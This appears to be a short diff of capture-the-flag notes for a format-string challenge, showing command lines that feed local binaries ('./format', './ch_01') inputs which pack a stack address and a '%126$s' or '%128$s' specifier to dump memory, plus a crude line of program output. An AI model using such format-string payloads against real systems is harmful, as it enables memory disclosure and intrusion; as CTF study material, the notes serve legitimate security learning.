@@ -22,8 +22,10 @@
 
 
 ::. Dumping All the Address Space  :D
-bffff958
-./ch_01 $'\x58\xf9\xff\xbf\xff\xff\xff%128$s'
+bffff970
+
+./format $'\x70\xf9\xff\xbfAAA%126$s'
+./ch_01 $'\x58\xf9\xff\xbfAAA%128$s'
  Shut your fucking face, uncle fucka!
 
 mabj@envy:~/Documents/project/capture_the_flag_ucon/format$ ./ch_01 $'\x58\xf9\xff\xbf\xff\xff\xff%128$s'
